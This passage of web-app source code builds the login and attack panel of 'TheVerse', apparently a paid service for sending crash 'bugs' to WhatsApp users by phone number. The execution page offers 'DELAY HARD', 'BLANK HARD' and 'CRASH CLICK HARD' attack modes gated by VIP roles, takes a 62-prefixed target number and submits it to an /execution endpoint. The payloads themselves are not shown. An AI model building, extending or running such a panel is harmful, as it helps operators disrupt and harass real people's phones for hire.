        0 0 30px rgba(0, 204, 136, 0.6),
        0 0 60px rgba(0, 204, 136, 0.3),
        inset 0 0 30px rgba(0, 204, 136, 0.1);
      backdrop-filter: blur(15px);
      position: relative;
      z-index: 10;
      animation: containerGlow 3s ease-in-out infinite;
    }
    
    @keyframes containerGlow {
      0%, 100% {
        box-shadow: 
          0 0 30px rgba(0, 204, 136, 0.6),
          0 0 60px rgba(0, 204, 136, 0.3),
          inset 0 0 30px rgba(0, 204, 136, 0.1);
      }
      50% {
        box-shadow: 
          0 0 40px rgba(0, 204, 136, 0.8),
          0 0 80px rgba(0, 204, 136, 0.4),
          inset 0 0 40px rgba(0, 204, 136, 0.15);
      }
    }
    
    .logo-container {
      display: flex;
      justify-content: center;
      margin-bottom: 25px;
      position: relative;
    }
    
    .logo {
      width: 100%;
      max-width: 280px;
      height: auto;
      aspect-ratio: 16/9;
      border-radius: 12px;
      object-fit: cover;
      border: 2px solid #f2f2f2;
      box-shadow: 
        0 0 25px rgba(0, 204, 136, 0.8),
        0 0 50px rgba(0, 204, 136, 0.4);
      transition: all 0.3s ease;
      animation: logoFloat 4s ease-in-out infinite;
    }
    
    @keyframes logoFloat {
      0%, 100% {
        transform: translateY(0px);
      }
      50% {
        transform: translateY(-10px);
      }
    }
    
    .logo:hover {
      transform: scale(1.05) translateY(-5px);
      box-shadow: 
        0 0 35px rgba(0, 204, 136, 1),
        0 0 70px rgba(0, 204, 136, 0.6);
    }
    
    .title {
      font-size: 42px;
      color: #f2f2f2;
      font-weight: 900;
      text-align: center;
      margin-bottom: 10px;
      text-shadow: 
        0 0 20px rgba(0, 204, 136, 0.8),
        0 0 40px rgba(0, 204, 136, 0.5);
      letter-spacing: 3px;
      animation: titlePulse 2s ease-in-out infinite;
    }
    
    @keyframes titlePulse {
      0%, 100% {
        text-shadow: 
          0 0 20px rgba(0, 204, 136, 0.8),
          0 0 40px rgba(0, 204, 136, 0.5);
      }
      50% {
        text-shadow: 
          0 0 30px rgba(0, 204, 136, 1),
          0 0 60px rgba(0, 204, 136, 0.7);
      }
    }
    
    .subtitle {
      font-size: 14px;
      color: #f2f2f2;
      text-align: center;
      margin-bottom: 30px;
      opacity: 0.8;
      letter-spacing: 2px;
      font-weight: 500;
    }
    
    .form-group {
      margin-bottom: 25px;
      position: relative;
    }
    
    .input-wrapper {
      position: relative;
      display: flex;
      align-items: center;
    }
    
    .input-icon {
      position: absolute;
      left: 15px;
      color: #f2f2f2;
      font-size: 18px;
      z-index: 2;
      transition: all 0.3s ease;
    }
    
    .form-input {
      width: 100%;
      padding: 15px 15px 15px 50px;
      background: rgba(0, 204, 136, 0.05);
      border: 2px solid #f2f2f2;
      border-radius: 10px;
      color: #ffffff;
      font-size: 16px;
      font-family: 'Orbitron', sans-serif;
      transition: all 0.3s ease;
      outline: none;
    }
    
    .form-input::placeholder {
      color: rgba(255, 255, 255, 0.4);
      font-family: 'Orbitron', sans-serif;
    }
    
    .form-input:focus {
      background: rgba(0, 204, 136, 0.1);
      box-shadow: 
        0 0 20px rgba(0, 204, 136, 0.5),
        inset 0 0 10px rgba(0, 204, 136, 0.2);
      border-color: #00ffaa;
    }
    
    .form-input:focus ~ .input-icon {
      color: #00ffaa;
      transform: scale(1.2);
    }
    
    .login-btn {
      width: 100%;
      padding: 15px;
      background: linear-gradient(135deg, #f2f2f2, #00ffaa);
      border: none;
      border-radius: 10px;
      color: #000000;
      font-size: 18px;
      font-weight: 900;
      font-family: 'Orbitron', sans-serif;
      cursor: pointer;
      transition: all 0.3s ease;
      letter-spacing: 3px;
      box-shadow: 
        0 0 20px rgba(0, 204, 136, 0.6),
        0 4px 15px rgba(0, 204, 136, 0.4);
      position: relative;
      overflow: hidden;
    }
    
    .login-btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: -100%;
      width: 100%;
      height: 100%;
      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
      transition: left 0.5s ease;
    }
    
    .login-btn:hover::before {
      left: 100%;
    }
    
    .login-btn:hover {
      transform: translateY(-3px);
      box-shadow: 
        0 0 30px rgba(0, 204, 136, 0.8),
        0 6px 25px rgba(0, 204, 136, 0.6);
    }
    
    .login-btn:active {
      transform: translateY(-1px);
    }
    
    .footer {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      margin-top: 25px;
    }
    
    .footer-btn {
      background: rgba(0, 204, 136, 0.1);
      border: 2px solid #f2f2f2;
      border-radius: 10px;
      padding: 12px 20px;
      font-size: 14px;
      font-weight: 600;
      color: #f2f2f2;
      display: flex;
      align-items: center;
      gap: 8px;
      transition: all 0.3s ease;
      text-decoration: none;
      cursor: pointer;
      font-family: 'Orbitron', sans-serif;
    }
    
    .footer-btn:hover {
      background: rgba(0, 204, 136, 0.2);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 204, 136, 0.4);
    }
    
    .footer-btn i {
      font-size: 16px;
    }
    
    .close-btn {
      position: absolute;
      top: 15px;
      right: 15px;
      width: 35px;
      height: 35px;
      border: 2px solid #f2f2f2;
      border-radius: 50%;
      background: rgba(0, 204, 136, 0.1);
      color: #f2f2f2;
      font-size: 20px;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: all 0.3s ease;
      z-index: 100;
    }
    
    .close-btn:hover {
      background: rgba(0, 204, 136, 0.3);
      transform: rotate(90deg);
      box-shadow: 0 0 15px rgba(0, 204, 136, 0.6);
    }
    
    @media (max-width: 480px) {
      .container {
        padding: 30px 20px;
      }
      
      .title {
        font-size: 36px;
      }
      
      .logo {
        max-width: 240px;
      }
      
      .form-input {
        font-size: 14px;
        padding: 13px 13px 13px 45px;
      }
      
      .login-btn {
        font-size: 16px;
        padding: 13px;
      }
    }
  </style>
</head>
<body>
  <canvas id="particleCanvas"></canvas>
  
  <div class="container">
    <div class="logo-container">
      <img src="https://cdn.yupra.my.id/yp/q266hzty.jpg" alt="TheVerse Logo" class="logo">
    </div>
    
    <h1 class="title">THEVERSE</h1>
    <p class="subtitle">GATEWAY THROUGH SHADOWS AND FIRE</p>
    
    <form id="loginForm" method="POST" action="/auth">
      <div class="form-group">
        <div class="input-wrapper">
          <i class="fas fa-user input-icon"></i>
          <input type="text" name="username" class="form-input" placeholder="Username" required>
        </div>
      </div>
      
      <div class="form-group">
        <div class="input-wrapper">
          <i class="fas fa-key input-icon"></i>
          <input type="password" name="key" class="form-input" placeholder="API Key" required>
        </div>
      </div>
      
      <button type="submit" class="login-btn">
        <i class="fas fa-sign-in-alt"></i> LOGIN
      </button>
    </form>
    
    <div class="footer">
      <a href="https://t.me/dxychi" class="footer-btn" target="_blank">
        <i class="fab fa-telegram"></i> Developer
      </a>
      <a href="#" class="footer-btn">
        <i class="fas fa-question-circle"></i> Help
      </a>
    </div>
  </div>

  <script>
    // Particle Animation
    const canvas = document.getElementById('particleCanvas');
    const ctx = canvas.getContext('2d');
    
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    
    window.addEventListener('resize', () => {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    });
    
    const particles = [];
    const particleCount = 80;
    
    class Particle {
      constructor() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * canvas.height;
        this.size = Math.random() * 3 + 1;
        this.speedX = Math.random() * 2 - 1;
        this.speedY = Math.random() * 2 - 1;
        this.opacity = Math.random() * 0.5 + 0.3;
      }
      
      update() {
        this.x += this.speedX;
        this.y += this.speedY;
        
        if (this.x > canvas.width || this.x < 0) this.speedX *= -1;
        if (this.y > canvas.height || this.y < 0) this.speedY *= -1;
      }
      
      draw() {
        ctx.fillStyle = 'rgba(0, 204, 136, ' + this.opacity + ')';
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
        
        // Draw orbit lines
        ctx.strokeStyle = 'rgba(0, 204, 136, ' + (this.opacity * 0.3) + ')';
        ctx.lineWidth = 1;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size * 3, 0, Math.PI * 2);
        ctx.stroke();
      }
    }
    
    function init() {
      particles.length = 0;
      for (let i = 0; i < particleCount; i++) {
        particles.push(new Particle());
      }
    }
    
    function connectParticles() {
      for (let i = 0; i < particles.length; i++) {
        for (let j = i + 1; j < particles.length; j++) {
          const dx = particles[i].x - particles[j].x;
          const dy = particles[i].y - particles[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          
          if (dist < 150) {
            ctx.strokeStyle = 'rgba(0, 204, 136, ' + (0.2 * (1 - dist / 150)) + ')';
            ctx.lineWidth = 1;
            ctx.beginPath();
            ctx.moveTo(particles[i].x, particles[i].y);
            ctx.lineTo(particles[j].x, particles[j].y);
            ctx.stroke();
          }
        }
      }
    }
    
    function animate() {
      ctx.clearRect(0, 0, canvas.width, canvas.height);
      
      particles.forEach(particle => {
        particle.update();
        particle.draw();
      });
      
      connectParticles();
      requestAnimationFrame(animate);
    }
    
    init();
    animate();
  </script>
</body>
</html>
`;

// Execution page HTML
const executionPageHTML = (userInfo, mode = '', target = '', message = '') => {
  const { username, role, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TheVerse Web | Panel</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --primary: #f2f2f2;
      --secondary: #008855;
      --accent: #00ffaa;
      --text: #e6e6fa;
      --dark: #000000;
      --light: #f8f8ff;
      --success: #00ff7f;
      --danger: #ff4444;
      --warning: #ffaa00;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Orbitron', sans-serif;
    }
    
    body {
      background: #000000;
      color: var(--text);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }
    
    #atomCanvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      pointer-events: none;
    }
    
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        radial-gradient(circle at 20% 30%, rgba(0, 204, 136, 0.05) 0%, transparent 20%),
        radial-gradient(circle at 80% 70%, rgba(0, 255, 170, 0.05) 0%, transparent 20%);
      z-index: 0;
    }
    
    .container {
      background: rgba(0, 0, 0, 0.9);
      border: 2px solid var(--primary);
      padding: 30px;
      border-radius: 15px;
      max-width: 500px;
      width: 100%;
      box-shadow: 
        0 0 30px rgba(0, 204, 136, 0.5),
        inset 0 0 20px rgba(0, 204, 136, 0.1);
      backdrop-filter: blur(10px);
      position: relative;
      overflow: hidden;
      transition: all 0.3s ease;
      z-index: 1;
    }
    
    .container::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to bottom right,
        transparent 45%,
        rgba(0, 204, 136, 0.1) 50%,
        transparent 55%
      );
      animation: shine 3s infinite;
      z-index: -1;
    }
    
    @keyframes shine {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    .logo-container {
  position: relative;
  width: 100%;
  max-width: 380px; /* Bisa diatur: 360–400px */
  margin: 0 auto 20px; /* Center + jarak bawah */
  display: block;
}

.main-logo {
  width: 100%;
  height: auto;
  aspect-ratio: 16/9;
  border-radius: 10px;
  object-fit: cover;
  border: 2px solid var(--primary);
  box-shadow: 0 0 30px rgba(0, 204, 136, 0.7);
  display: block;
  margin: 0 auto;
}

.logo-text-overlay {
  position: absolute;
  bottom: 8px;
  left: 8px;
  color: var(--primary);
  font-size: 20px;
  font-weight: 700;
  text-shadow: 
    0 0 10px rgba(0, 204, 136, 0.8),
    2px 2px 4px rgba(0, 0, 0, 0.9);
  line-height: 1.3;
  z-index: 2;
  letter-spacing: 0.5px;
}
    
    .logo:hover {
      transform: scale(1.02);
      box-shadow: 0 0 40px rgba(0, 204, 136, 0.9);
    }
    
    .status-badge {
      position: absolute;
      top: 0;
      right: 0;
      background: var(--success);
      color: #000;
      padding: 5px 10px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: bold;
      box-shadow: 0 0 10px rgba(0, 255, 127, 0.5);
      animation: pulse 2s infinite;
    }
    
    @keyframes pulse {
      0% { box-shadow: 0 0 0 0 rgba(0, 255, 127, 0.7); }
      70% { box-shadow: 0 0 0 10px rgba(0, 255, 127, 0); }
      100% { box-shadow: 0 0 0 0 rgba(0, 255, 127, 0); }
    }
    
    .username {
      font-size: 24px;
      color: var(--primary);
      font-weight: bold;
      text-align: center;
      margin-bottom: 5px;
      text-shadow: 0 0 10px rgba(0, 204, 136, 0.7);
      letter-spacing: 2px;
    }
    
    .role-badge {
      display: inline-block;
      padding: 3px 8px;
      border-radius: 4px;
      font-size: 12px;
      font-weight: bold;
      margin-left: 8px;
      text-transform: uppercase;
    }
    
    .owner-badge {
      background: var(--primary);
      color: #000;
    }
    
    .admin-badge {
      background: #ffaa00;
      color: #000;
    }
    
    .moderator-badge {
      background: #00f0ff;
      color: #000;
    }
    
    .helper-badge {
      background: #00ff7f;
      color: #000;
    }
    
    .premium-badge {
      background: #ff00e6;
      color: #fff;
    }
    
    .vip-badge {
      background: linear-gradient(to right, #ffaa00, #ff00e6);
    }
    
    .exclusive-badge {
      background: linear-gradient(to right, #00ff7f, #ffaa00);
    }
    
    .status {
      font-size: 14px;
      color: var(--success);
      margin-bottom: 20px;
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 8px;
    }
    
    .status::before {
      content: '';
      width: 10px;
      height: 10px;
      background: var(--success);
      border-radius: 50%;
      display: inline-block;
      box-shadow: 0 0 10px var(--success);
    }
    
    .input-group {
      position: relative;
      margin-bottom: 20px;
    }
    
    .input-group input {
      width: 100%;
      padding: 15px 15px 15px 45px;
      border-radius: 8px;
      background: rgba(20, 20, 40, 0.7);
      border: 1px solid var(--primary);
      color: var(--text);
      font-size: 16px;
      transition: all 0.3s ease;
    }
    
    .input-group input:focus {
      outline: none;
      border-color: var(--accent);
      box-shadow: 0 0 15px rgba(0, 204, 136, 0.5);
    }
    
    .input-group i {
      position: absolute;
      left: 15px;
      top: 50%;
      transform: translateY(-50%);
      color: var(--primary);
    }
    
    .mode-selector {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 12px;
      margin-bottom: 20px;
    }
    
    .mode-btn {
      padding: 15px;
      border: none;
      border-radius: 8px;
      background: rgba(20, 20, 40, 0.7);
      color: var(--text);
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      text-align: left;
      display: flex;
      align-items: center;
      gap: 10px;
      border-left: 5px solid var(--primary);
      position: relative;
    }
    
    .mode-btn:hover {
      background: rgba(0, 204, 136, 0.2);
      transform: translateX(5px);
    }
    
    .mode-btn.selected {
      background: var(--primary);
      color: #000;
      box-shadow: 0 0 20px rgba(0, 204, 136, 0.7);
    }
    
    .mode-btn:disabled {
      opacity: 0.5;
      cursor: not-allowed;
    }
    
    .mode-tooltip {
      position: absolute;
      bottom: 100%;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0, 0, 0, 0.8);
      color: white;
      padding: 8px 12px;
      border-radius: 6px;
      font-size: 12px;
      width: 200px;
      text-align: center;
      opacity: 0;
      visibility: hidden;
      transition: all 0.3s ease;
      z-index: 10;
      pointer-events: none;
    }
    
    .mode-btn:hover .mode-tooltip {
      opacity: 1;
      visibility: visible;
      transform: translateX(-50%) translateY(-5px);
    }
    
    .execute-button {
      background: var(--primary);
      color: #000;
      padding: 15px;
      width: 100%;
      border-radius: 8px;
      font-weight: bold;
      border: none;
      margin-bottom: 20px;
      cursor: pointer;
      transition: all 0.3s ease;
      position: relative;
      overflow: hidden;
      letter-spacing: 2px;
      text-transform: uppercase;
      box-shadow: 0 0 20px rgba(0, 204, 136, 0.5);
    }
    
    .execute-button:disabled {
      background: #333;
      cursor: not-allowed;
      opacity: 0.7;
    }
    
    .execute-button:not(:disabled):hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(0, 204, 136, 0.6);
      background: var(--accent);
    }
    
    .execute-button:not(:disabled):active {
      transform: translateY(1px);
    }
    
    .execute-button::after {
      content: '';
      position: absolute;
      top: -50%;
      left: -50%;
      width: 200%;
      height: 200%;
      background: linear-gradient(
        to bottom right,
        transparent 45%,
        rgba(255, 255, 255, 0.3) 50%,
        transparent 55%
      );
      animation: shine 3s infinite;
      z-index: 0;
    }
    
    .progress-container {
      width: 100%;
      height: 8px;
      background: rgba(20, 20, 40, 0.7);
      border-radius: 4px;
      margin-bottom: 20px;
      overflow: hidden;
      display: none;
      position: relative;
    }
    
    .progress-bar {
      height: 100%;
      width: 0%;
      background: linear-gradient(to right, var(--primary), var(--accent));
      border-radius: 4px;
      transition: width 0.3s ease;
      position: relative;
      overflow: hidden;
    }
    
    .progress-bar::after {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: linear-gradient(
        90deg,
        transparent,
        rgba(255, 255, 255, 0.3),
        transparent
      );
      animation: progressShine 2s infinite;
    }
    
    @keyframes progressShine {
      0% { transform: translateX(-100%); }
      100% { transform: translateX(100%); }
    }
    
    .attack-status {
      display: none;
      text-align: center;
      margin-bottom: 20px;
      color: var(--primary);
      text-shadow: 0 0 10px rgba(0, 204, 136, 0.7);
    }
    
    .footer {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 10px;
      margin-top: 20px;
    }
    
    .footer-btn {
      background: var(--primary);
      border: 1px solid var(--primary);
      border-radius: 8px;
      padding: 10px 15px;
      font-size: 14px;
      color: #000;
      display: flex;
      align-items: center;
      gap: 8px;
      transition: all 0.3s ease;
      text-decoration: none;
      font-weight: 600;
      box-shadow: 0 0 10px rgba(0, 204, 136, 0.3);
    }
    
    .footer-btn:hover {
      background: var(--accent);
      transform: translateY(-2px);
      box-shadow: 0 5px 15px rgba(0, 204, 136, 0.5);
    }
    
    .footer-btn i {
      font-size: 16px;
    }
    
    .user-info {
      width: 100%;
      text-align: center;
      font-size: 12px;
      color: var(--primary);
      margin-top: 15px;
      display: flex;
      flex-direction: column;
      gap: 5px;
    }
    
    .user-info span {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 5px;
    }
    
    .terminal {
      background: rgba(0, 0, 0, 0.5);
      border: 1px solid var(--primary);
      border-radius: 5px;
      padding: 10px;
      margin-bottom: 20px;
      font-family: 'Orbitron', monospace;
      color: var(--success);
      text-shadow: 0 0 5px rgba(0, 255, 127, 0.5);
      max-height: 150px;
      overflow-y: auto;
    }
    
    .terminal-line {
      animation: terminalTyping 2s steps(40, end);
      white-space: nowrap;
      overflow: hidden;
      border-right: 2px solid var(--primary);
    }
    
    @keyframes terminalTyping {
      from { width: 0 }
      to { width: 100% }
    }
    
    @media (max-width: 768px) {
      .container {
        padding: 20px;
      }
      
      .logo {
        max-width: 280px;
      }
      
      .username {
        font-size: 20px;
      }
      
      .mode-selector {
        grid-template-columns: 1fr;
      }
      
      .logo-text {
        font-size: 9px;
        bottom: 6px;
        left: 6px;
      }
    }
    
    @media (max-width: 480px) {
      body {
        padding: 10px;
      }
      
      .container {
        padding: 15px;
      }
      
      .logo {
        max-width: 240px;
      }
      
      .logo-text {
        font-size: 8px;
        bottom: 4px;
        left: 4px;
      }
/* Success Popup Styles */
.popup-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0, 0, 0, 0.7);
  display: flex;
  justify-content: center;
  align-items: center;
  z-index: 1000;
  opacity: 0;
  visibility: hidden;
  transition: opacity 0.3s ease, visibility 0.3s ease;
}

.popup-overlay.show {
  opacity: 1;
  visibility: visible;
}

.popup-content {
  background: rgba(0, 20, 10, 0.9);
  border: 2px solid var(--primary);
  border-radius: 15px;
  padding: 30px 40px;
  text-align: center;
  box-shadow: 
    0 0 30px rgba(0, 255, 127, 0.6),
    inset 0 0 15px rgba(0, 255, 127, 0.1);
  max-width: 90%;
  width: 320px;
  transform: scale(0.8);
  transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
}

.popup-overlay.show .popup-content {
  transform: scale(1);
}

.checkmark {
  width: 80px;
  height: 80px;
  margin: 0 auto 20px;
  animation: popIn 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards;
}

@keyframes popIn {
  0% {
    transform: scale(0) rotate(-45deg);
    opacity: 0;
  }
  70% {
    transform: scale(1.1) rotate(5deg);
  }
  100% {
    transform: scale(1) rotate(0);
    opacity: 1;
  }
}

.popup-text {
  color: var(--success);
  font-size: 18px;
  font-weight: bold;
  text-shadow: 0 0 10px rgba(0, 255, 127, 0.7);
  line-height: 1.4;
  word-break: break-all;
}

/* Optional: Glow effect on checkmark */
.checkmark svg {
  filter: drop-shadow(0 0 8px rgba(0, 255, 127, 0.8));
}      
    }
  </style>
</head>
<body>
  <canvas id="atomCanvas"></canvas>
  <div class="container">
    <div class="logo-container">
  <img src="https://cdn.yupra.my.id/yp/q266hzty.jpg" alt="TheVerse Logo" class="main-logo">
  <div class="logo-text-overlay">🎭TheVerse<br>#BarzDev</div>
</div>
    
    <div class="username">
      ${username}
      <span class="role-badge ${role}-badge">${role}</span>
    </div>
    <div class="status">CONNECTED TO THEVERSE NETWORK</div>

    ${message ? `<div class="terminal"><div class="terminal-line">${message}</div></div>` : ''}

    <div class="input-group">
      <i class="fas fa-mobile-alt"></i>
      <input type="text" id="targetInput" placeholder="62xxxxxxxxxx" autocomplete="off" value="${target || ''}">
    </div>

    <div class="progress-container" id="progressContainer">
      <div class="progress-bar" id="progressBar"></div>
    </div>

    <div class="attack-status" id="attackStatus">
      <div class="terminal" id="terminal">
        <div class="terminal-line">Initializing attack sequence...</div>
      </div>
    </div>

<div class="mode-selector">
      <button class="mode-btn" data-mode="ph4ntom">
        <i class="fab fa-android"></i>
        <span>DELAY HARD</span>
        <div class="mode-tooltip">Android Delay Attack - Requires: VIP</div>
      </button>
      <button class="mode-btn" data-mode="extr4vaz">
        <i class="fab fa-android"></i>
        <span>BLANK HARD</span>
        <div class="mode-tooltip">Android Blank Attack - Requires: VIP</div>
      </button>
      <button class="mode-btn" data-mode="sl4yerz">
        <i class="fab fa-apple"></i>
        <span>CRASH CLICK HARD</span>
        <div class="mode-tooltip">Crash Attack - Requires: VIP</div>
      </button>
    </div>

    <!-- ✅ FORM ATTACK CONFIGURATION DIHAPUS -->

    <button class="execute-button" id="executeBtn" disabled>
      <i class="fas fa-bolt"></i> EXECUTE
    </button>

    <div class="footer">
      <a href="https://t.me/dxychi" class="footer-btn" target="_blank">
        <i class="fab fa-telegram"></i> Developer
      </a>
      <a href="/logout" class="footer-btn">
        <i class="fas fa-sign-out-alt"></i> Logout
      </a>
      ${[ROLES.OWNER, ROLES.ADMIN, ROLES.MODERATOR, ROLES.HELPER].includes(role) 
  ? '<a href="/dashboard" class="footer-btn"><i class="fas fa-tachometer-alt"></i> Dashboard</a>' 
  : ''}
    </div>

    <div class="user-info">
      <span><i class="fas fa-user"></i> ${username}</span>
      <span><i class="fas fa-clock"></i> ${formattedTime}</span>
    </div>
  </div>
  <!-- Success Popup -->
<div id="successPopup" class="popup-overlay">
  <div class="popup-content">
    <div class="checkmark">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
        <circle cx="26" cy="26" r="25" fill="none" stroke="#00ff7f" stroke-width="3"/>
        <path fill="none" stroke="#00ff7f" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
      </svg>
    </div>
    <div class="popup-text" id="popupMessage">Success send bug to</div>
  </div>
</div>

  <script>
    // Terminal-like logging
    function logToTerminal(message) {
      const terminal = document.getElementById('terminal');
      terminal.innerHTML = '';
      const line = document.createElement('div');
      line.className = 'terminal-line';
      line.textContent = '> ' + message;
      terminal.appendChild(line);
      terminal.scrollTop = terminal.scrollHeight;
    }
    
    const targetInput = document.getElementById('targetInput');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const progressContainer = document.getElementById('progressContainer');
    const progressBar = document.getElementById('progressBar');
    const attackStatus = document.getElementById('attackStatus');
    
    let selectedMode = null;
    
    function isValidNumber(number) {
      const pattern = /^62\\d{9,13}$/;
      return pattern.test(number);
    }
    
    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        if (button.disabled) {
          logToTerminal("You don't have permission to use this attack mode!");
          return;
        }
        
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        
        // ✅ Langsung aktifkan execute jika nomor valid
        if (isValidNumber(targetInput.value.trim())) {
          executeBtn.disabled = false;
        }
      });
    });
    
    targetInput.addEventListener('input', () => {
      if (isValidNumber(targetInput.value.trim()) && selectedMode) {
        executeBtn.disabled = false;
      } else {
        executeBtn.disabled = true;
      }
    });
    
    executeBtn.addEventListener('click', () => {
      const number = targetInput.value.trim();
      
      if (!isValidNumber(number)) {
        logToTerminal("Invalid number format! Must start with 62 and be 10-15 digits long.");
        return;
      }
      
      if (!selectedMode) {
        logToTerminal("Please select an attack mode first!");
        return;
      }
      
      // ✅ Tidak ada parameter count/duration — langsung kirim
      executeBtn.disabled = true;
      executeBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> PROCESSING';
      progressContainer.style.display = 'block';
      attackStatus.style.display = 'block';
      
      document.getElementById('terminal').innerHTML = '';
      logToTerminal("Process send bug...");
      
      let progress = 0;
      const interval = setInterval(() => {
        progress += 5;
        progressBar.style.width = progress + '%';
        
        if (progress >= 100) {
          clearInterval(interval);
          // Tampilkan popup sukses
             const popup = document.getElementById('successPopup');
  const messageEl = document.getElementById('popupMessage');
  messageEl.textContent = 'Success send bug to' + number;
  popup.classList.add('show');

            // Redirect setelah 2.5 detik
                setTimeout(() => {
                window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
            }, 100);
        }
      }, 100);
    });
    
    setTimeout(() => {
      targetInput.focus();
    }, 500);
  </script>
</body>
</html>`;
};

// Owner dashboard HTML
const ownerDashboardHTML = (users, activeSenders = [], currentUserRole = ROLES.OWNER) => {
  const canManageUsers = hasManagementPermission(currentUserRole, 'userManagement');
  const canManageSenders = hasManagementPermission(currentUserRole, 'senderManagement');
  
  return `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TheVerse | Owner Dashboard</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    :root {
      --primary: #f2f2f2;
      --secondary: #008855;
      --accent: #00ffaa;
      --text: #e6e6fa;
      --dark: #000000;
      --light: #f8f8ff;
      --success: #00ff7f;
      --danger: #ff4444;
      --warning: #ffaa00;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Montserrat', sans-serif;
    }
    
    body {
      background: var(--dark);
      color: var(--text);
      min-height: 100vh;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }
    
    #atomCanvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 0;
      pointer-events: none;
    }
    
    .content-wrapper {
      position: relative;
      z-index: 1;
    }
    
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 30px;
      animation: slideDown 0.6s ease;
    }
    
    @keyframes slideDown {
      from {
        opacity: 0;
        transform: translateY(-20px);
      }
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }
    
    .logo-container {
      display: flex;
      align-items: center;
      gap: 15px;
    }
    
    .logo {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid var(--primary);
      box-shadow: 0 0 20px rgba(0, 204, 136, 0.7);
      transition: all 0.3s ease;
    }
    
    .logo:hover {
      transform: rotate(360deg) scale(1.1);
      box-shadow: 0 0 30px rgba(0, 204, 136, 1);
    }
    
    .title {
      font-family: 'Orbitron', sans-serif;
      color: var(--primary);
      text-shadow: 0 0 15px rgba(0, 204, 136, 0.7);
      letter-spacing: 2px;
    }
    
    .nav-buttons {
      display: flex;
      gap: 10px;
    }
    
    .nav-btn {
      background: rgba(0, 204, 136, 0.1);
      border: 2px solid var(--primary);
      border-radius: 10px;
      padding: 10px 20px;
      font-size: 14px;
      color: var(--text);
      display: flex;
      align-items: center;
      gap: 8px;
      transition: all 0.3s ease;
      text-decoration: none;
      position: relative;
      overflow: hidden;
    }
    
    .nav-btn::before {
      content: '';
      position: absolute;
      top: 50%;
      left: 50%;
      width: 0;
      height: 0;
      border-radius: 50%;
      background: rgba(0, 204, 136, 0.3);
      transform: translate(-50%, -50%);
      transition: width 0.6s, height 0.6s;
    }
    
    .nav-btn:hover::before {
      width: 300px;
      height: 300px;
    }
    
    .nav-btn:hover {
      background: var(--primary);
      color: var(--dark);
      transform: translateY(-3px);
      box-shadow: 0 5px 20px rgba(0, 204, 136, 0.5);
    }
    
    .nav-btn i {
      position: relative;
      z-index: 1;
    }
    
    .nav-btn span {
      position: relative;
      z-index: 1;
    }
    
    .dashboard-container {
